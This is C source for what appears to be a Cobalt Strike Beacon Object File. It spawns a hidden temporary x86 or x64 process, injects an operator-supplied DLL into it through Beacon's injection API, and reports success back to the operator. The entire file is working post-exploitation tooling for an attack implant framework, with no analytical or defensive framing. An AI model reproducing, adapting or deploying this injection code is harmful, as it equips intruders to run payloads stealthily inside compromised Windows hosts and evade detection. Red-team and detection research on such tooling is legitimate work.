#include <windows.h>
#include "beacon.h"

/* is this an x64 BOF */
BOOL is_x64() {
#if defined _M_X64
   return TRUE;
#elif defined _M_IX86
   return FALSE;
#endif
}

/* See gox86 and gox64 entry points */
void go(char * args, int alen, BOOL x86) {
   STARTUPINFOA        si;
   PROCESS_INFORMATION pi;
   datap               parser;
   short               ignoreToken;
   char *              dllPtr;
   int                 dllLen;

   /* Warn about crossing to another architecture. */
   if (!is_x64() && x86 == FALSE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x86 -> x64");
   }
   if (is_x64() && x86 == TRUE) {
      BeaconPrintf(CALLBACK_ERROR, "Warning: inject from x64 -> x86");
   }

   /* Extract the arguments */
   BeaconDataParse(&parser, args, alen);
   ignoreToken = BeaconDataShort(&parser);
   dllPtr = BeaconDataExtract(&parser, &dllLen);

   /* zero out these data structures */
   __stosb((void *)&si, 0, sizeof(STARTUPINFO));
   __stosb((void *)&pi, 0, sizeof(PROCESS_INFORMATION));

   /* setup the other values in our startup info structure */
   si.dwFlags = STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.cb = sizeof(STARTUPINFO);

   /* Ready to go: spawn, inject and cleanup */
   if (!BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi)) {
      BeaconPrintf(CALLBACK_ERROR, "Unable to spawn %s temporary process.", x86 ? "x86" : "x64");
      return;
   }
   BeaconInjectTemporaryProcess(&pi, dllPtr, dllLen, 0, NULL, 0);

   BeaconPrintf(CALLBACK_OUTPUT, "[DEFAULT KIT] Operation successfully executed!\n");

   BeaconCleanupProcess(&pi);
}

void gox86(char * args, int alen) {
   go(args, alen, TRUE);
}

void gox64(char * args, int alen) {
   go(args, alen, FALSE);
}


